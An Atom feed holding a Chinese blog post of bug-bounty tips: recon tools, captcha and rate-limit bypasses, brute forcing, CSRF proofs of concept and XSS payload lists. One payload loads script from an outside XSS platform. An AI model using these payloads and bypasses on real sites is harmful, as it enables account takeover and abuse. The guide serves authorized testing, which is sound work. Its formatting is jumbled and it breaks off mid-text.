<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Shu1L&#39;s blog</title>
  
  <subtitle>一只菜鸟白帽子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://shu1l.github.io/"/>
  <updated>2021-01-16T13:37:55.583Z</updated>
  <id>https://shu1l.github.io/</id>
  
  <author>
    <name>Shu1L</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SRC混子的漏洞挖掘之道</title>
    <link href="https://shu1l.github.io/2021/01/16/src-hun-zi-de-lou-dong-wa-jue-zhi-dao/"/>
    <id>https://shu1l.github.io/2021/01/16/src-hun-zi-de-lou-dong-wa-jue-zhi-dao/</id>
    <published>2021-01-16T13:36:41.000Z</published>
    <updated>2021-01-16T13:37:55.583Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SRC混子的漏洞挖掘之道"><a href="#SRC混子的漏洞挖掘之道" class="headerlink" title="SRC混子的漏洞挖掘之道"></a>SRC混子的漏洞挖掘之道</h2><p>本文首先于先知社区:<a href="https://xz.aliyun.com/t/8501" target="_blank" rel="noopener">SRC混子的漏洞挖掘之道 - 先知社区 (aliyun.com)</a></p><p>一个SRC混子挖SRC的半年经验分享~,基本都是文字阐述，希望能给同样在挖洞的师傅们带来一点新收获。</p><h3 id="前期信息收集"><a href="#前期信息收集" class="headerlink" title="前期信息收集"></a>前期信息收集</h3><p> 还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括<strong>企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话</strong>等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。</p><h4 id="企业相关信息收集"><a href="#企业相关信息收集" class="headerlink" title="企业相关信息收集"></a>企业相关信息收集</h4><ul><li><p>企查查 (<a href="https://www.qcc.com" target="_blank" rel="noopener">https://www.qcc.com）</a>/)</p></li><li><p>天眼查(<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a>)</p></li><li><p>启信宝（<a href="https://www.qixin.com/" target="_blank" rel="noopener">https://www.qixin.com/</a>)</p><p> 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。</p></li></ul><p><strong>主要查询的信息:</strong></p><ol><li>一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。</li><li>查看同电话企业基本都是子公司。</li><li>查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。</li><li>查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产)</li></ol><p>PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。</p><ul><li><p>站长之家:</p><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a></p><ul><li>邮箱反查、注册人反查、电话反查。</li><li>推荐个项目:<a href="https://github.com/code-scan/BroDomain" target="_blank" rel="noopener">https://github.com/code-scan/BroDomain</a> 兄弟域名查询。</li></ul></li><li><p><a href="https://www.qimai.cn/" target="_blank" rel="noopener">https://www.qimai.cn/</a></p><ul><li>七麦数据，可以查到企业下一些比较冷门的app。</li></ul></li></ul><p><strong>信息整理</strong></p><p>当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息</p><ul><li><p>主公司及分公司、子公司下所有归属的网站域名信息；</p></li><li><p>主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。</p></li><li><p>主公司及分公司、子公司下所有的app资产和微信小程序。</p><p>之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。</p></li></ul><h4 id="子域名收集和网站信息收集"><a href="#子域名收集和网站信息收集" class="headerlink" title="子域名收集和网站信息收集"></a>子域名收集和网站信息收集</h4><p> 子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。</p><h5 id="通过github收集子域名"><a href="#通过github收集子域名" class="headerlink" title="通过github收集子域名"></a>通过github收集子域名</h5><p> 先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。</p><h5 id="oneforAll"><a href="#oneforAll" class="headerlink" title="oneforAll"></a>oneforAll</h5><p><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">https://github.com/shmilylty/OneForAll</a></p><ul><li>需要到配置文件里填写api接口信息，</li><li>根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。</li></ul><p>命令</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python oneforall.py <span class="params">--targets</span> <span class="string">./domain.txt</span> run</span><br><span class="line">python oneforall.py <span class="params">--targets</span> <span class="string">./domain.txt</span>  <span class="params">--brute</span> <span class="literal">true</span> run</span><br></pre></td></tr></table></figure><p> 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。</p><h5 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h5><p>子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码，</p><p><a href="https://github.com/timwhitez/rad-xray" target="_blank" rel="noopener">https://github.com/timwhitez/rad-xray</a> 命令改一下能批量探测子域名，一般5到10分钟一个子域。</p><h5 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h5><p>官网:<a href="https://gobies.org/" target="_blank" rel="noopener">https://gobies.org/</a></p><p> 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:<a href="https://github.com/hellogoldsnakeman/masnmapscan-V1.0" target="_blank" rel="noopener">https://github.com/hellogoldsnakeman/masnmapscan-V1.0</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。</span><br></pre></td></tr></table></figure><p> 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。</p><h5 id="BBScan"><a href="#BBScan" class="headerlink" title="BBScan"></a>BBScan</h5><p>猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。</p><p>项目地址:</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><p><a href="https://github.com/yhy0/BBScan" target="_blank" rel="noopener">https://github.com/yhy0/BBScan</a> （添加了springboot的泄露探测）</p><ul><li>可以对域名、ip、C段进行探测</li><li>快速探测管理后台</li><li>进行端口探测</li><li>探测敏感信息泄露</li><li>可以自定义扫描规则</li></ul><p>report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。</p><h5 id="js信息收集"><a href="#js信息收集" class="headerlink" title="js信息收集"></a>js信息收集</h5><p>主要是爬取网站的敏感js文件，js中能收集到的信息:</p><ul><li>增加攻击面(url、域名)</li><li>敏感信息(密码、API密钥、加密方式)</li><li>代码中的潜在危险函数操作</li><li>具有已知漏洞的框架</li></ul><p>常用的工具</p><p>速度很快的jsfinder <a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a></p><p>xray的rad爬虫 <a href="https://github.com/chaitin/rad" target="_blank" rel="noopener">https://github.com/chaitin/rad</a></p><p>能够匹配敏感信息的JSINFO-SCAN：<a href="https://github.com/p1g3/JSINFO-SCAN" target="_blank" rel="noopener">https://github.com/p1g3/JSINFO-SCAN</a></p><h3 id="捡中低危漏洞的一些技巧"><a href="#捡中低危漏洞的一些技巧" class="headerlink" title="捡中低危漏洞的一些技巧"></a>捡中低危漏洞的一些技巧</h3><p> 刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">框架注入</span><br><span class="line"> 明文密码传输</span><br><span class="line"> 表单破解漏洞</span><br><span class="line"> <span class="selector-tag">IIS</span>短文件名泄露</span><br><span class="line"> 老旧过期的<span class="selector-tag">HTTPS</span>服务</span><br><span class="line"> 跨目录下载漏洞</span><br><span class="line"> 目录可浏览漏洞</span><br><span class="line"> <span class="selector-tag">LFI</span>本地文件包含漏洞</span><br><span class="line"> <span class="selector-tag">RFI</span>远程文件包含漏洞</span><br><span class="line"> <span class="selector-tag">HTTP</span>拒绝服务攻击</span><br><span class="line"> 弱口令登录</span><br><span class="line"> <span class="selector-tag">CSRF</span>跨站点请求伪造</span><br><span class="line"> <span class="selector-tag">Flash</span>点击劫持</span><br><span class="line"> <span class="selector-tag">SQL</span>注入漏洞</span><br><span class="line"> <span class="selector-tag">XSS</span>跨站脚本漏洞</span><br><span class="line"> 文件上传漏洞</span><br><span class="line"> 解析漏洞<span class="selector-pseudo">:IIS</span>解析漏洞</span><br><span class="line"> 解析漏洞<span class="selector-pseudo">:Apache</span>解析漏洞</span><br><span class="line"> <span class="selector-tag">Cookies</span>注入漏洞</span><br><span class="line"> 越权访问漏洞</span><br><span class="line"> 命令执行漏洞</span><br><span class="line"> <span class="selector-tag">Struts2</span>远程代码执行漏洞</span><br><span class="line"> 业务逻辑漏洞</span><br><span class="line"> 用户隐私泄露</span><br><span class="line"> 敏感信息泄漏(运维)</span><br><span class="line"> 敏感信息泄漏(研发)</span><br><span class="line"> 敏感文件泄漏(运维)(配置)</span><br><span class="line"> 敏感文件泄漏(运维)(权限)</span><br><span class="line"> 未验证的重定向和传递</span><br><span class="line"> <span class="selector-tag">Flash</span>跨域访问资源</span><br><span class="line"> 测试文件泄漏</span><br><span class="line"> 开启危险的<span class="selector-tag">HTTP</span>方法</span><br><span class="line"> <span class="selector-tag">HTTP</span>参数污染</span><br><span class="line"> <span class="selector-tag">Unicode</span>编码绕过</span><br><span class="line"> 源码泄漏</span><br><span class="line"> 后台目录泄漏</span><br><span class="line"> 链接注入漏洞</span><br><span class="line"> <span class="selector-tag">SSRF</span>服务器请求伪造</span><br><span class="line"> <span class="selector-tag">jsonp</span>劫持</span><br></pre></td></tr></table></figure><p>学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。</p><ul><li>乌云漏洞库:<a href="https://wooyun.x10sec.org/" target="_blank" rel="noopener">https://wooyun.x10sec.org/</a></li><li>hackone报告：<a href="https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA" target="_blank" rel="noopener">https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA</a> 提取码:2klt</li></ul><p>这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。</p><h4 id="登录框处常见的一些漏洞"><a href="#登录框处常见的一些漏洞" class="headerlink" title="登录框处常见的一些漏洞"></a>登录框处常见的一些漏洞</h4><p> 在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。</p><p><strong>现在还能用的接码平台:</strong></p><ul><li><a href="http://www.114sim.com/" target="_blank" rel="noopener">http://www.114sim.com/</a></li><li><a href="https://yunduanxin.net/China-Phone-Number/" target="_blank" rel="noopener">https://yunduanxin.net/China-Phone-Number/</a></li><li><a href="https://www.materialtools.com/" target="_blank" rel="noopener">https://www.materialtools.com/</a></li></ul><h5 id="绕过限制导致的爆破、撞库、用户遍历漏洞"><a href="#绕过限制导致的爆破、撞库、用户遍历漏洞" class="headerlink" title="绕过限制导致的爆破、撞库、用户遍历漏洞"></a>绕过限制导致的爆破、撞库、用户遍历漏洞</h5><p>最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势:</p><ul><li><p>验证码不刷新</p></li><li><p>验证码抓包绕过</p></li><li><p>验证码删除绕过</p></li><li><p>验证码置空绕过</p></li><li><p>修改xff头绕过:推荐个burp插件,<a href="https://github.com/TheKingOfDuck/burpFakeIP" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/burpFakeIP</a></p></li><li><p>账号后加空格绕过账号错误次数限制。</p><p>一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。</p></li></ul><h5 id="弱口令漏洞"><a href="#弱口令漏洞" class="headerlink" title="弱口令漏洞"></a>弱口令漏洞</h5><p><strong>没有验证码或者验证码可以绕过的情况</strong></p><p>直接上一手字典爆破，当然还是有一些小技巧:</p><ul><li><p>比如可以设置固定的弱密码，比如123456，然后爆破账号。</p></li><li><p>比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:<a href="https://github.com/HongLuDianXue/BaiLu-SED-Tool" target="_blank" rel="noopener">https://github.com/HongLuDianXue/BaiLu-SED-Tool</a></p><p>爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章:</p></li><li><p><a href="https://xz.aliyun.com/t/7823" target="_blank" rel="noopener">https://xz.aliyun.com/t/7823</a></p></li><li><p><a href="https://github.com/huyuanzhi2/password_brute_dictionary" target="_blank" rel="noopener">https://github.com/huyuanzhi2/password_brute_dictionary</a></p></li></ul><p><strong>有验证码且无法绕过的情况</strong></p><ul><li>github直接找员工账号邮箱，密码。</li><li>源码或者js文件查找线索，邮箱，或者加密的账号密码。</li><li>特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。</li><li>手动尝试常见弱口令。</li></ul><h5 id="注册、登录、找回密码处的短信-邮箱轰炸漏洞"><a href="#注册、登录、找回密码处的短信-邮箱轰炸漏洞" class="headerlink" title="注册、登录、找回密码处的短信\邮箱轰炸漏洞"></a>注册、登录、找回密码处的短信\邮箱轰炸漏洞</h5><p>这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势:</p><ul><li>加空格绕过</li><li>加任意字母绕过</li><li>前面加86绕过</li><li>xff头伪造ip绕过</li></ul><h5 id="逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞"><a href="#逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞" class="headerlink" title="逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞"></a>逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞</h5><p>因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候</p><p>类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大:</p><p><a href="https://www.freebuf.com/author/yangyangwithgnu" target="_blank" rel="noopener">https://www.freebuf.com/author/yangyangwithgnu</a></p><h4 id="常见的信息泄露漏洞"><a href="#常见的信息泄露漏洞" class="headerlink" title="常见的信息泄露漏洞"></a>常见的信息泄露漏洞</h4><p>敏感信息泄露的范围很广，我认为一般就是两大类，</p><ul><li>因为配置错误或者管理不当导致的企业内部信息泄露。</li><li>因为逻辑缺陷导致的用户资料泄露(遍历)。</li></ul><h5 id="github导致的信息泄露"><a href="#github导致的信息泄露" class="headerlink" title="github导致的信息泄露"></a>github导致的信息泄露</h5><ul><li><p>P牛知识星球里分享的github搜索关键词:<a href="https://twitter.com/obheda12/status/1316513838716551169" target="_blank" rel="noopener">https://twitter.com/obheda12/status/1316513838716551169</a></p></li><li><p>github子域名监控项目:<a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></p></li><li><p>常见的泄露内容:</p><ul><li>员工内部邮箱、登录账号、密码。</li><li>企业的一些内部系统域名、ip泄露。</li><li>企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。</li></ul><p>乌云上有一些案例，可以看一看。</p></li></ul><h5 id="配置错误导致的信息泄露"><a href="#配置错误导致的信息泄露" class="headerlink" title="配置错误导致的信息泄露"></a>配置错误导致的信息泄露</h5><p>包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。</p><p>我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描</p><p>比如:</p><ul><li>备份文件的小字典</li><li>springboot泄露的小字典</li><li>网站后台的小字典</li></ul><p>比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。</p><p>可视化的比如TEST404系列、御剑扫描器使用体验也不错。</p><p> 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。</p><h5 id="越权导致的信息泄露"><a href="#越权导致的信息泄露" class="headerlink" title="越权导致的信息泄露"></a>越权导致的信息泄露</h5><p> 很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。</p><p>推荐几个burp插件:</p><ul><li>未授权检测： <a href="https://github.com/theLSA/burp-unauth-checker" target="_blank" rel="noopener">https://github.com/theLSA/burp-unauth-checker</a></li><li>敏感参数提取：<a href="https://github.com/theLSA/burp-sensitive-param-extractor" target="_blank" rel="noopener">https://github.com/theLSA/burp-sensitive-param-extractor</a></li><li>信息提取：<a href="https://github.com/theLSA/burp-info-extractor" target="_blank" rel="noopener">https://github.com/theLSA/burp-info-extractor</a></li></ul><p>插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。</p><p><strong>常见的一些越权情况:</strong></p><ul><li>基于用户ID的越权</li><li>基于功能对象ID的越权</li><li>基于上传对象ID的越权</li><li>基于未授权访问的越权</li><li>基于功能地址的越权</li><li>基于接口身份的越权</li></ul><h3 id="其他的OWASPTop10漏洞"><a href="#其他的OWASPTop10漏洞" class="headerlink" title="其他的OWASPTop10漏洞"></a>其他的OWASPTop10漏洞</h3><h4 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h4><p> CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。</p><p><strong>常见的漏洞点</strong></p><p>1、修改个人资料、邮箱、密码、头像</p><p>2、发表文章</p><p>3、添加、删除评论</p><p>4、添加、修改、删除收货地址</p><p>5、添加管理员</p><p><strong>(1) GET型</strong></p><p>GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用：</p><ul><li><pre><code>&lt;img src=http://www.xxxxx.com/csrf?xx=11 /&gt;<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(**2) <span class="keyword">POST</span>型**</span><br><span class="line"></span><br><span class="line"> <span class="keyword">POST</span>请求中没有<span class="keyword">token</span>参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有<span class="keyword">token</span>等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。</span><br><span class="line"></span><br><span class="line">poc(可以用burp自己生成的）:</span><br></pre></td></tr></table></figure>&lt;html&gt;    &lt;body&gt;         &lt;form name=&quot;px&quot; method=&quot;post&quot; action=&quot;http://www.xxxxx.com/add&quot;&gt;            &lt;input type=&quot;text&quot; name=&quot;user_id&quot; value=&quot;1111&quot;&gt;        &lt;/form&gt;       &lt;script&gt;document.px.submit(); &lt;/script&gt;     &lt;/body&gt; &lt;/html&gt;<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">POST</span>请求数据为json，当服务器没有严格校验content-<span class="keyword">type</span>类型时，<span class="type">POC</span>为：</span><br></pre></td></tr></table></figure>&lt;script&gt;  var xhr = new XMLHttpRequest();  xhr.open(&quot;POST&quot;, &quot;http://www.xxxx.com/api/setrole&quot;);  xhr.withCredentials = true;  xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&quot;);  xhr.send(&apos;{&quot;role&quot;:admin}&apos;);&lt;/script&gt;<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### <span class="number">3.</span> Flash 型</span><br><span class="line"></span><br><span class="line">Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。</span><br><span class="line"></span><br><span class="line">利用条件：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、目标站点下必须存在crossdomain.xml文件。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、crossdomain.xml中的配置允许其他域进行跨域请求。</span><br></pre></td></tr></table></figure>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;cross-domain-policy&gt;  &lt;allow-access-from domain=&quot;*&quot; /&gt;&lt;/cross-domain-policy&gt;<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="strong">**bypass小技巧**</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>删除csrf token</span><br><span class="line"><span class="bullet">- </span>置空csrf token</span><br><span class="line"><span class="bullet">- </span>修改请求方法，如POST方法变GET请求</span><br><span class="line"><span class="bullet">- </span>使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么</span><br><span class="line"><span class="bullet">- </span>使用固定token</span><br><span class="line"><span class="bullet">- </span>token字段改成 token[]=</span><br><span class="line"></span><br><span class="line"><span class="section">#### 任意文件上传漏洞</span></span><br><span class="line"></span><br><span class="line"> 这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。</span><br><span class="line"><span class="bullet">- </span>上传恶意文件进行钓鱼</span><br><span class="line"><span class="bullet">- </span>尝试在上传的文件名前加../进行目录穿越。</span><br><span class="line"><span class="bullet">- </span>可以结合其他漏洞比如CORS漏洞扩大危害。</span><br><span class="line"></span><br><span class="line"> 文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。</span><br><span class="line"></span><br><span class="line"><span class="section">#### XSS漏洞</span></span><br><span class="line"></span><br><span class="line">老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章:</span><br><span class="line">https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html</span><br><span class="line"></span><br><span class="line">Broken5师傅的xsspayload:</span><br></pre></td></tr></table></figure>&lt;script&gt;alert(1)&lt;/script&gt;&lt;script src=https://xsspt.com/VBAhTu&gt;&lt;/script&gt;&lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;&lt;svg onload=alert(1)&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;img src=https://www.baidu.com/img/bd_logo1.png onload=alert(1)&gt;&lt;details open ontoggle=alert(1)&gt;&lt;body onload=alert(1)&gt;&lt;M onmouseover=alert(1)&gt;M&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;&lt;iframe onload=alert(1)&gt;&lt;input type=&quot;submit&quot; onfocus=alert(1)&gt;&lt;input type=&quot;submit&quot; onclick=alert(1)&gt;&lt;form&gt;&lt;input type=&quot;submit&quot; formaction=javascript:alert(1)&gt;<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### bypass姿势</span><br></pre></td></tr></table></figure>&lt;!-- 空格被过滤 --&gt;&lt;img/src=&quot;1&quot;/onerror=alert(1)&gt;</code></pre></li></ul><!-- 双写绕过 --><iimgmg src=1 oonerrornerror=aimglert(1)><!-- 大小写绕过  --><iMg src=1 oNerRor=alert(1)><!-- 利用eval() --><img src=1 onerror="a=`aler`;b=`t(1)`;eval(a+b);"><img src=1 onerror=eval(atob('YWxlcnQoMSk='))><!-- 利用location --><p>&lt;img src=1 onerror=location=’javascript:%61%6C%65%72%74%28%31%29’&gt;<br>&lt;img src=1 onerror=location=’javascript:\x61\x6C\x65\x72\x74\x28\x31\x29’&gt;<br>&lt;img src=1 onerror=location=”javascr”+”ipt:”+”%61%6C%65%72%74%28%31%29”&gt;</p><!-- 括号被过滤 --><img src=1 onerror="window.onerror=eval;throw'=alert\x281\x29';"><!-- onerror=被过滤 --><img src=1 onerror     =alert(1)><img src=1 onerror=alert(1)><!-- 属性被转换为大写 --><img src=1 onerror=alert(1)><!-- 编码后被检测 --><img src=1 onerror=alert(1)>```<h4 id="威胁情报的提交"><a href="#威胁情报的提交" class="headerlink" title="威胁情报的提交"></a>威胁情报的提交</h4><p>这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的</p><p><a href="https://mp.weixin.qq.com/s/v2MRx7qs70lpnW9n-mJ7_Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/v2MRx7qs70lpnW9n-mJ7_Q</a></p><p><a href="https://bbs.ichunqiu.com/article-921-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/article-921-1.html</a></p><p>可以试一试加一加各种羊毛群，反手撸一手羊毛群的羊毛。</p><h3 id="对于挖掘高危、严重级别漏洞的一些思考"><a href="#对于挖掘高危、严重级别漏洞的一些思考" class="headerlink" title="对于挖掘高危、严重级别漏洞的一些思考"></a>对于挖掘高危、严重级别漏洞的一些思考</h3><p> 因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。</p><h5 id="1-自动化信息收集的能力"><a href="#1-自动化信息收集的能力" class="headerlink" title="1.自动化信息收集的能力"></a>1.自动化信息收集的能力</h5><p>这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。</p><p> 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。</p><h5 id="2-打漏洞组合拳的能力"><a href="#2-打漏洞组合拳的能力" class="headerlink" title="2.打漏洞组合拳的能力"></a>2.打漏洞组合拳的能力</h5><p> SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。</p><h5 id="3-绕waf的能力"><a href="#3-绕waf的能力" class="headerlink" title="3.绕waf的能力"></a>3.绕waf的能力</h5><p> 这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。</p><h5 id="4-细心和耐心和一些运气"><a 